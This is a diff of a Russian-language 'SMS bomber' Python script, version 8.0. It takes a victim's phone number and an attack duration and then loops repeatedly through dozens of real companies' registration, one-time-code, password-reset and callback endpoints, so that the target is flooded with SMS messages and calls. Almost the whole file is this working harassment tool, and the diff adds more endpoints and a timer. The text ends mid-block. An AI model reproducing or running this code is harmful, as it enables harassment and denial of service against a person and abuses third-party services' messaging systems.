@@ -1,10 +1,16 @@
 # -*- coding: utf-8 -*-
+#   Version 8.0
+
+import os
+import time
 import requests, random, datetime, sys, time, argparse, os , colorama
 from colorama import Fore, Back, Style
 from colorama import init
 init()
-print(Fore.YELLOW)
+os.system("clear")
+os.system("CLS")
 
+print(Fore.YELLOW)
 banner = """
 
 ░██████╗███╗░░░███╗░██████╗░░░░░░██████╗░░█████╗░███╗░░░███╗██████╗░███████╗██████╗░░░░░░░██████╗░░█████╗░░█████╗░
@@ -13,9 +19,14 @@ banner = """
 ░╚═══██╗██║╚██╔╝██║░╚═══██╗╚════╝██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗╚════╝░╚═══██╗██║░░██║██║░░██║
 ██████╔╝██║░╚═╝░██║██████╔╝░░░░░░██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║░░░░░░██████╔╝╚█████╔╝╚█████╔╝
 ╚═════╝░╚═╝░░░░░╚═╝╚═════╝░░░░░░░╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝░░░░░░╚═════╝░░╚════╝░░╚════╝░   
-
-                                                                   v.7.5 ( Made in Ivan Zaitsev )            
-
+                                                                   v.8.0 (Разработчик: Иван Зайцев)   
+  
+  __________________________________________________________________________________________
+  |                                                                                         |
+  | VK -- https://vk.com/ivan_vzlom300                                                      |
+  |                                                                                         |
+  | YouTube -- https://www.youtube.com/channel/UCTftz8MsYtAE80D9Vrd20rQ?view_as=subscriber  |        
+  |_________________________________________________________________________________________|                                                                                         
 """
 
 
@@ -24,9 +35,19 @@ banner = """
 
 print(banner)
 print(Fore.GREEN)
-print("\n Что бы отключить программу нажмите Ctrl + C ")
-print(Fore.BLUE)
-_phone = input('\n Введи номер (Без +)>> ')
+print("\n ЧТо вЫйти из прОграМмы нАжмиТе Ctrl + C иЛи на КРЕСТИК в пРавоМ верХнем угЛу.")
+print(Fore.RED)
+_phone = input('\n ВвEди ноMер (Без +): ')
+
+kol = input("\n ВрЕмя аТакИ в сЕк.(Ставить не меньше 10000000000): ")
+
+
+
+start_time = time.time() 
+CLOSE_AFTER = kol
+
+
+
 
 
 R = 0
@@ -68,12 +89,36 @@ _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'
 _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
 
 _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
-print(Fore.RED)
-print("\n СПАМ ПОШЕЛ !")
+print(Fore.YELLOW)
+os.system("clear")
+os.system("CLS")
 print(Fore.GREEN)
+print("""    _   _   _             _      ____  _             _   _             
+   / \ | |_| |_ __ _  ___| | __ / ___|| |_ __ _ _ __| |_(_)_ __   __ _ 
+  / _ \| __| __/ _` |/ __| |/ / \___ \| __/ _` | '__| __| | '_ \ / _` |
+ / ___ \ |_| || (_| | (__|   <   ___) | || (_| | |  | |_| | | | | (_| |
+/_/   \_\__|\__\__,_|\___|_|\_\ |____/ \__\__,_|_|   \__|_|_| |_|\__, |
+                                                                 |___/""")
+print ("[                    ] 0% ")
+time.sleep(4)
+print ("[=====               ] 25%")
+time.sleep(1)
+print ("[==========          ] 50%")
+time.sleep(7)
+print ("[===============     ] 75%")
+time.sleep(3)
+print ("[====================] 100%")
+time.sleep(5)
+print(Fore.RED)
+print("Атака началась на || " +str(_phone) +"||DDos-SMS-Attack")
+
+
+print(Fore.GREEN)
+
 iteration = 0
 while True:
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
+    
     try:
 
         requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'}) 
@@ -83,7 +128,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -97,7 +142,7 @@ while True:
 
         print('[-] Не отправлено !')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -109,9 +154,9 @@ while True:
 
     except:
 
-        print('[-] Не отправлен !')
+        print('[-] Не отправленo !')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -125,7 +170,7 @@ while True:
 
         print('[-] не отправлено!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -139,7 +184,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -153,7 +198,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -167,7 +212,7 @@ while True:
 
         print('[-] error in sent!')
 
-        
+    if time.time() > start_time + float(CLOSE_AFTER): break    
 
     try:
 
@@ -181,7 +226,7 @@ while True:
 
         print('[-] не отправлено!')
 
-    
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -195,7 +240,7 @@ while True:
 
         print('[-] не отправлено!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -209,7 +254,7 @@ while True:
 
         print('[-] не отправлено!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -223,7 +268,7 @@ while True:
 
         print('[-] не отправлено!')
 
-     
+    if time.time() > start_time + float(CLOSE_AFTER): break 
 
     try:
 
@@ -237,7 +282,7 @@ while True:
 
         print('[-] не отправлено!')
 
-        
+    if time.time() > start_time + float(CLOSE_AFTER): break    
 
     try:
 
@@ -251,7 +296,7 @@ while True:
 
         print('[-] не отправлено!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -265,7 +310,7 @@ while True:
 
         print('[-] не отправлено!')
 
-    
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -279,7 +324,7 @@ while True:
 
         print('[-] не отправлено!')
 
-    
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -293,7 +338,7 @@ while True:
 
         print('[-]  не отправлено!')
 
-    
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -307,7 +352,7 @@ while True:
 
         print('[-] не отправлено!')
 
-    
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -321,7 +366,7 @@ while True:
 
         print('[-] не отправлено!')
 
-         
+    if time.time() > start_time + float(CLOSE_AFTER): break     
 
     try:
 
@@ -335,7 +380,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -349,7 +394,7 @@ while True:
 
         print('[+] error in sent!')
 
-    
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -363,7 +408,7 @@ while True:
 
         print('[-] не отправлено!')
 
-    
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -377,13 +422,13 @@ while True:
 
         print('[-] Kasta Не отправлено!')
 
-        
+    if time.time() > start_time + float(CLOSE_AFTER): break   
 
     try:
 
         requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/', data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
         R = R + 1
-        print('Тaxi отправлено! || Кол-во - '+ str(R))
+        print('[+] Тaxi отправлено! || Кол-во - '+ str(R))
 
         time.sleep(0.1)
 
@@ -391,7 +436,7 @@ while True:
 
         print('[-] не отправлено!')
 
-        
+    if time.time() > start_time + float(CLOSE_AFTER): break   
 
     try:
 
@@ -405,7 +450,7 @@ while True:
 
         print('[-] не отправлено!')
 
-    
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -419,7 +464,7 @@ while True:
 
         print('[-] не отправлено!')
 
-    
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -433,7 +478,7 @@ while True:
 
         print('[-] не отправлено!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -447,7 +492,7 @@ while True:
 
         print('[-] не отправлено!')
 
-    
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -462,7 +507,7 @@ while True:
 
         print('[-] не отправлено!')
 
-    
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -476,7 +521,7 @@ while True:
 
         print('[-] не отправлено!')
 
-        
+    if time.time() > start_time + float(CLOSE_AFTER): break   
 
     try:
 
@@ -490,7 +535,7 @@ while True:
 
         print('[-] не отправлено!')
 
-    
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -504,7 +549,7 @@ while True:
 
         print('[-] не отправлено!')
 
-    
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -518,7 +563,7 @@ while True:
 
         print('[-] не отправлено!')
 
-    
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -532,7 +577,7 @@ while True:
 
         print('[-] не отправлено!')
 
-        
+    if time.time() > start_time + float(CLOSE_AFTER): break    
 
     try:
 
@@ -546,7 +591,7 @@ while True:
 
         print('[-] Niyama не отправлено!')
 
-    
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -560,7 +605,7 @@ while True:
 
         print('[-] VSK не отправлено!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -574,7 +619,7 @@ while True:
 
         print('[-] не отправлено!')
 
-    
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -588,7 +633,7 @@ while True:
 
         print('[-] не отправлено!')
 
-        
+    if time.time() > start_time + float(CLOSE_AFTER): break    
 
     try:
 
@@ -602,7 +647,7 @@ while True:
 
         print('[-] не отправлено!')
 
-        
+    if time.time() > start_time + float(CLOSE_AFTER): break    
 
     try:
 
@@ -616,7 +661,7 @@ while True:
 
         print('[-] не отправлено!')
 
-    
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -630,7 +675,7 @@ while True:
 
         print('[-] не отправлено!')
 
-    
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -644,7 +689,7 @@ while True:
 
         print('[-] не отправлено!')
 
-    
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -658,7 +703,7 @@ while True:
 
         print('[-] не отправлено!')
 
-    
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -672,7 +717,7 @@ while True:
 
         print('[-] не отправлено!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -686,7 +731,7 @@ while True:
 
         print('[-] не отправлено!')
 
-    
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -700,7 +745,7 @@ while True:
 
         print('[-] не отправлено!')
 
-            
+    if time.time() > start_time + float(CLOSE_AFTER): break       
 
     try:
 
@@ -714,7 +759,7 @@ while True:
 
         print('[-] не отправлено!')
 
-        
+    if time.time() > start_time + float(CLOSE_AFTER): break    
 
     try:
 
@@ -728,7 +773,7 @@ while True:
 
         print('[-] не отправлено!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -742,7 +787,7 @@ while True:
 
         print('[-] не отправлено!')
 
-   
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -756,7 +801,7 @@ while True:
 
         print('[-] не отправлено!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -770,7 +815,7 @@ while True:
 
         print('[-] не отправлено!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -784,7 +829,7 @@ while True:
 
         print('[-] не отправлено!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -798,7 +843,7 @@ while True:
 
         print('[-] не отправлено!')
 
-    
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -812,7 +857,7 @@ while True:
 
         print('[-] не отправлено!')
 
-    
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -826,7 +871,7 @@ while True:
 
         print('[-] не отправлено!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -840,7 +885,7 @@ while True:
 
         print('[-] не отправлено!')
 
-   
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -854,7 +899,7 @@ while True:
 
         print('[+] не отправлено!')    
 
-    
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -868,7 +913,7 @@ while True:
 
         print('[-] не отправлено!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -882,7 +927,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -896,7 +941,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -910,7 +955,7 @@ while True:
 
         print('[-] Rutube in sent!')
 
- 
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -924,7 +969,7 @@ while True:
 
         print('[-] не отправлено!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -938,7 +983,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -952,7 +997,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -966,7 +1011,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -980,7 +1025,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -994,7 +1039,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1008,7 +1053,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1022,7 +1067,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1036,7 +1081,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1050,7 +1095,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1064,7 +1109,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1078,7 +1123,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1092,7 +1137,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1106,7 +1151,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1120,7 +1165,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1134,7 +1179,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1148,7 +1193,7 @@ while True:
 
         print('[-] Звонок не отпрвлен !')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1162,7 +1207,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1176,7 +1221,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1190,7 +1235,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1204,7 +1249,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1218,7 +1263,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1232,7 +1277,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1246,7 +1291,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1260,7 +1305,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1274,7 +1319,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1287,7 +1332,7 @@ while True:
     except:
 
         print('[-] error in sent!')
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
 
     try:
@@ -1302,7 +1347,7 @@ while True:
 
         print('[-] error in sent!')
 
-        
+    if time.time() > start_time + float(CLOSE_AFTER): break      
 
     try:
 
@@ -1316,7 +1361,7 @@ while True:
 
         print('[-] не отправлено!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1330,7 +1375,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1342,7 +1387,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1356,7 +1401,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1370,7 +1415,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1384,7 +1429,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1398,7 +1443,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1412,7 +1457,21 @@ while True:
 
         print('[-] error in sent!')
 
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
+    try:
+
+        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
+        R = R + 1
+        print('[+] Alpari отправлено! || Кол-во - '+ str(R))
+        
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1426,7 +1485,7 @@ while True:
 
         print('[-] error in sent!')
 
-
+    if time.time() > start_time + float(CLOSE_AFTER): break
 
     try:
 
@@ -1439,23 +1498,658 @@ while True:
     except:
 
         print('[-] error in sent!')
-
-
-
-
-
-
+    if time.time() > start_time + float(CLOSE_AFTER): break  
 
     try:
 
-        iteration += 1
-
-        print(('{} круг пройден.').format(iteration))
-
-        print('Возникли вопросы ? Пишите разработчику в ВК [ --> Иван Зайцев <-- ]')
+        requests.get('https://requests.service.banki.ru/form/960/submit', params={"callback": "submitCallback","name": _name,"phone": "+" + _phone,"email": _email,"gorod": "Москва","approving_data": "1",})
+        R = R + 1
+        print('[+] Banki отправлено! || Кол-во - '+ str(R))
 
         time.sleep(0.1)
 
     except:
 
-        break
+        print('[-] не отправлено!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
+        R = R + 1
+        print('[+] IVI отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] не отправлено!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://www.moyo.ua/identity/registration', data={"firstname": _name, "phone": _phone,"email":_email})
+        R = R + 1
+        print('[+] Moyo отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] не отправлено!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
+        R = R + 1
+        print('[+] Helsi отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[+] не отправлено!')    
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"}, json={"Phone": _phone, "Type": 1})
+        R = R + 1
+        print('[+] KinoLend отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] не отправлено!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
+        R = R + 1
+        print('[+] PizzaHut отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
+        R = R + 1
+        print('[+] Rabota отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
+        R = R + 1
+        print('[+] Rutube отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] Rutube in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
+        R = R + 1
+        print('[+] Citilink отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] не отправлено!')
+
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+    try:
+
+        requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
+        R = R + 1
+        print('[+] Smsint отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
+        R = R + 1
+        print('[+] oyorooms отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode', params={"pageName":"registerPrivateUserPhoneVerificatio"}, data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "",})
+        R = R + 1
+        print('[+] MVIDEO отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break 
+
+    try:
+
+        requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
+        R = R + 1
+        print('[+] newnext отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
+        R = R + 1
+        print('[+] Sunlight отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
+        R = R + 1
+        print('[+] alpari отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
+        R = R + 1
+        print('[+] Invitro отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
+        R = R + 1
+        print('[+] Sberbank отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
+        R = R + 1
+        print('[+] Psbank отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
+        R = R + 1
+        print('[+] Beltelcom отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
+        R = R + 1
+        print('[+] Karusel отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
+        R = R + 1
+        print('[+] KFC отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
+        R = R + 1
+        print('[+] Yandex.Chef отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code', params={"msisdn": _phone})
+        R = R + 1
+        print('[+] MTS отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post("https://api.delitime.ru/api/v2/signup", data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
+        R = R + 1
+        print('[+] Delitime отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
+        R = R + 1
+        print('[+] findclone звонок отправлен! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] Звонок не отпрвлен !')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post("https://guru.taxi/api/v1/driver/session/verify", json={"phone": {"code": 1, "number": _phone}})
+        R = R + 1
+        print('[+] Guru отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
+        R = R + 1
+        print('[+] ICQ отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
